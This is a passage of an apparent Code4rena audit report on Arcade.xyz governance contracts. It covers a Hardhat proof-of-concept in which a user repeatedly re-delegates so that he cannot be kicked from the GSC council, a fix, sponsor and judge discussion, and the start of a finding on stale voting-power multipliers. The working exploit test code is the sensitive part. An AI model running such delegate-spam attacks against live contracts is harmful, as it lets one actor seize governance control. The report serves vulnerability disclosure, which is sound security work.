NFTBoostVault.connect(Alice).delegate(Alice.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Alice).addTokens(ALICES_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).delegate(Bob.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Alice becomes GSC member since she has enough voting power</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            expect(await arcadeGSCVault.members(Alice.address)).to.eq(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await arcadeGSCVault.connect(Alice).proveMembership([NFTBoostVault.address], [&quot;0x&quot;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            expect(await arcadeGSCVault.members(Alice.address)).not.to.eq(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Bob also becomes GSC member, but when he unstakes his tokens, Alice can kick him out</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], [&quot;0x&quot;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await arcadeGSCVault.connect(Alice).kick(Bob.address, [&quot;0x&quot;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            expect(await arcadeGSCVault.members(Bob.address)).to.eq(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // kicking out Bob succeeds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Bob adds tokens again and becomes GSC member, but this time performs the attack</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).delegate(Bob.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], [&quot;0x&quot;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // attack</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Bob performs it on himself</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            var gasUsed = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            for (var i = 0; i &lt; 3500; i++)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                const tx1 = await NFTBoostVault.connect(Bob).delegate(Alice.address); // needed since it&#39;s </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // impossible to change current delegatee to the same address</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                const tx2 = await NFTBoostVault.connect(Bob).delegate(Bob.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                const r1 = await tx1.wait();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                const r2 = await tx2.wait();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                gasUsed += r1.cumulativeGasUsed.toNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                gasUsed += r2.cumulativeGasUsed.toNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(`Gas used by the attacker: ${gasUsed}`);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Bob withdraws his tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Alice cannot kick out Bob</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            await expect(arcadeGSCVault.connect(Alice).kick(Bob.address, [&quot;0x&quot;])).to.be.reverted;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Bob is still GSC member; he can now transfer all his tokens to another account and perform</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // the attack again until he controls &gt; 50% of GSC</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }).timeout(400000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, hardhat</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change <code>BaseVotingVault::queryVotePower</code> implementation so that it calls <code>find</code> instead of <code>findAndClear</code> (as in the <code>queryVotePowerView</code>).</p>\n<h3 id=\"assessed-type-1\" style=\"position:relative;\"><a href=\"#assessed-type-1\" aria-label=\"assessed type 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>DoS</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412#issuecomment-1667932982\">PowVT (Arcade.xyz) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Need to add a check to the <code>NFTBoostVault</code> <code>delegate</code> function to check that a registration exists for the user calling it. This is a valid submission and will be addressed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412#issuecomment-1673330712\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>@PowVT - consider the C4 criteria, I don’t see how this results in a direct loss of funds; therefore, should probably be Medium.</p>\n<p>What are your thoughts?</p>\n<p>For reference - <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization#estimating-risk\">https://docs.code4rena.com/awarding/judging-criteria/severity-categorization#estimating-risk</a></p>\n<p>Going to downgrade to Medium for now. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412#issuecomment-1675226782\">PowVT (Arcade.xyz) commented</a>:</strong></p>\n<blockquote>\n<p>The vulnerability they mention about being ‘unkickable’ is a side effect of the <code>NFTBoostVault</code> not being used properly. The user should not be allowed to call <code>delegate</code> without an existing registration. I would agree with medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412#issuecomment-1679591092\">PowVT (Arcade.xyz) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>The vulnerability they mention about being ‘unkickable’ is a side effect of the NFTBoostVault not being used properly. The user should not be allowed to call <code>delegate</code> without an existing registration. I would agree with medium.</p>\n</blockquote>\n<p>Update here, I was incorrect in saying this solves the ‘unkickable’ issue. A check will be added so that the voting history does not exceed a certain length and does not cause out of gas reverts. Instead of pushing to the voting power array every time on delegating, we will add checks to confirm the length does not exceed X value (10 maybe).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412#issuecomment-1680941691\">0xnev (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @PowVT - When I was investigating this issue, I found out that actually this is a known issue in the docs of elementals council here, section 4 point 2. The root cause of the problem is the small staleblocklag set when deploying the <code>NFTBoostVault</code>/<code>VestingVault</code>.</p>\n<p><a href=\"https://docs.element.fi/governance-council/council-protocol-smart-contracts/voting-vaults/governance-steering-council-gsc-vault\">https://docs.element.fi/governance-council/council-protocol-smart-contracts/voting-vaults/governance-steering-council-gsc-vault</a></p>\n<p>I don’t think this invalidates the finding since you guys seem to not know about this, but the elemental council sets a sufficiently high staleblocklag of <code>200000</code> that can be seen <a href=\"https://etherscan.io/address/0x6De73946eab234F1EE61256F10067D713aF0e37A#readProxyContract\">here</a>. But if you do know, then this falls under admin input issues and could be invalidated under C4 rules; which I have tested against this submission and helps prevent the OOG problem stated in this submission. Hope this helps!</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-user-voting-power-is-not-synchronized-after-multiplier-changes\" style=\"position:relative;\"><a href=\"#m-04-user-voting-power-is-not-synchronized-after-multiplier-changes\" aria-label=\"m 04 user voting power is not synchronized after multiplier changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/283\">[M-04] User voting power is not synchronized after multiplier changes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/283\">ktg</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/545\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/431\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/287\">0xmuxyz</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/226\">0xbranded</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/225\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/203\">caventa</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/160\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/117\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/102\">BenRai</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/4\">0xastronatey</a></em></p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>User voting power is not synchronized after multiplier changes.</li>\n<li>If the manager decreases the multiplier for a token, users’ voting power will not be affected.</li>\n</ul>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Currently the function <code>setMultiplier</code> of contract <code>NFTBoostVault</code> is implemented as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMultiplier</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multiplierValue</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">multiplierValue</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">MAX_MULTIPLIER</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_MultiplierLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">NFTBoostVaultStorage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AddressUintUint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multiplierData</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getMultipliers</span><span class=\"mtk1\">()[</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">][</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set multiplier value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">multiplierData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">multiplier</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">multiplierValue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultiplierSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">multiplierValue</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The problem with this code is that it does not update the user’s voting power, even though their multiplier has changed. The contract did provide a function called <code>updateVotingPower</code> to update users’ voting power as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userAddresses</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">userAddresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">50</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NBV_ArrayTooManyElements</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">userAddresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">NFTBoostVaultStorage</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Registration</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">registration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getRegistrations</span><span class=\"mtk1\">()[</span><span class=\"mtk12\">userAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_syncVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">userAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">registration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We can argue that the manager can call this function to update users voting power after they change the multiplier; however, there are multiple problems with this solution:</p>\n<ul>\n<li>The input of <code>updateVotingPower</code> is a list of user addresses, so the manager must have a map of the token id to a list of users using that token ID as their multiplier. However, this data is not saved in the contract. When users register, their registrations are tracked using a variable of type <code>map(address => NFTBoostVaultStorage.Registration)</code>. I’ve looked into the contracts and found no way to retrieve a list of users associated with a token ID, even the function <code>_registerAndDelegate</code> does not emit an event showing which <code>ERC1155</code> token ID the users used at registration time.</li>\n<li>The function <code>updateVotingPower</code> only allows updating 50 addresses at a time, so if there are many users associated with a particular token ID, they have more time to try front running the manager.</li>\n</ul>\n<p>Below is a POC for this issue. Place this file under the <code>test</code> folder with the name <code>VotingPowerNotUpdatedAfterMultiplierChange.ts</code> and run it using the command <code>npx hardhat test test/VotingPowerNotUpdatedAfterMultiplierChange.ts</code>.</p>\n<p>The flow of this POC is as follows:</p>\n<ul>\n<li>Alice is minted a reputation badge.</li>\n<li>The reputation badge is then set as a multiplier by nft boost vault manager.</li>\n<li>Alice uses this reputation badge to boost their voting power.</li>\n<li>After the manager changes Alice’s badge multiplier, their voting power is unchanged.</li>\n</ul>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">import { expect } from &quot;chai&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { constants } from &quot;ethers&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { ethers, waffle } from &quot;hardhat&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { deploy } from &quot;./utils/deploy&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { TestContextGovernance, governanceFixture } from &quot;./utils/governanceFixture&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { TestContextToken, tokenFixture } from &quot;./utils/tokenFixture&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { provider, loadFixture } = waffle;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tArcadeToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tArcadeTreasury,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tCoreVoting,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tLockingVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tNFTBoostVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tVestingVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tArcadeTokenDistributor,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tARCDVestingVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tFeeController, MockERC1155, PromissoryNote,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tReputationBadge,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tIReputationBadge,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tIBadgeDescriptor</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> } from &quot;../../src/types&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> import { BlockchainTime } from &quot;./utils/time&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> import { MerkleTree } from &quot;merkletreejs&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { BADGE_MANAGER_ROLE } from &quot;./utils/constants&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">/**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> * nft boost vault test</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Governance operations with nft boost voting vault&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tconst ONE = ethers.utils.parseEther(&quot;1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tconst MULTIPLIER_DENOMINATOR = 1e3;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tconst MAX = ethers.constants.MaxUint256;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet signers: SignerWithAddress[];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet alice: Signer;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet arcdToken: ArcadeToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet arcdVestingVault: ARCDVestingVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet deployer: Signer;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet arcdDst: ArcadeTokenDistributor;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet reputationBadge: ReputationBadge;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet nftBoostVault: NFTBoostVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet feeController: FeeController;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet coreVoting: CoreVoting;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet blockchainTime: BlockchainTime;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tlet descriptor: IBadgeDescriptor;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tbeforeEach( async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// get signers</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsigners = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\talice = signers[6];</span></span>\n<span 